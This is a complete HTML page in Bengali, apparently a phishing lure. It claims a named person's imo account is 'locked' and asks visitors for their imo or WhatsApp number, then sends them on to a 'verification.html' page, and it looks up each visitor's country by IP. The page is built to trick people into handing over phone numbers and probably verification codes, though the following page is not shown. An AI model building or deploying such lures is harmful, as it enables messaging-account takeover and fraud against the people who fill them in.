<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Priya Akter Unlock</title>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css"/>

<style>
body{
  font-family:Arial, sans-serif;
  background:#f4f6f8;
  margin:0;
  padding:0;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.container{
  background:white;
  width:360px;
  border-radius:16px;
  box-shadow:0 8px 20px rgba(0,0,0,0.1);
  padding:25px 20px;
  text-align:center;
}

.profile-pic{
  width:80px;
  height:80px;
  border-radius:50%;
  object-fit:cover;
  margin-bottom:15px;
  border:2px solid #1e88ff;
}

h2{
  margin-bottom:5px;
  font-size:20px;
}
p{
  font-size:14px;
  color:#555;
  margin-bottom:20px;
}

#phone{
  width:100%;
  padding:12px 10px;
  border:1px solid #ddd;
  border-radius:10px;
  margin-bottom:20px;
  font-size:16px;
}

button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:12px;
  background:#cfcfcf;
  color:white;
  font-size:16px;
  cursor:not-allowed;
  transition:all 0.3s ease;
}
button.active{
  background:#1e88ff;
  cursor:pointer;
}
</style>
</head>
<body>

<div class="container">

  <img src="https://via.placeholder.com/80" alt="Profile Photo" class="profile-pic">

  <h2>Priya Akter</h2>
  <p>Priya Akter এর imo অ্যাকাউন্ট লক। নিচে ফাঁকা ঘরে imo/WhatsApp নাম্বার বসান।</p>

  <!-- Phone input: completely blank -->
  <input id="phone" type="tel" placeholder="">

  <button id="unlockBtn">Priya Akter আনলক করুন →</button>

</div>

<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
<script>
const input = document.querySelector("#phone");
const btn = document.getElementById("unlockBtn");

// intl-tel-input setup (flags hidden)
window.intlTelInput(input, {
  initialCountry: "auto",
  geoIpLookup: function(callback){
    fetch("https://ipapi.co/json")
      .then(res=>res.json())
      .then(data=>callback(data.country_code))
      .catch(()=>callback("bd"));
  },
  separateDialCode: false,  // no dial code
  nationalMode: false,
  utilsScript: ""  // no utils, keeps input simple
});

// Enable button when user types
input.addEventListener("input", function(){
  if(input.value.length>=6){
    btn.classList.add("active");
    btn.onclick = ()=>window.location.href="verification.html";
  }else{
    btn.classList.remove("active");
    btn.onclick = null;
  }
});
</script>
</body>
</html>
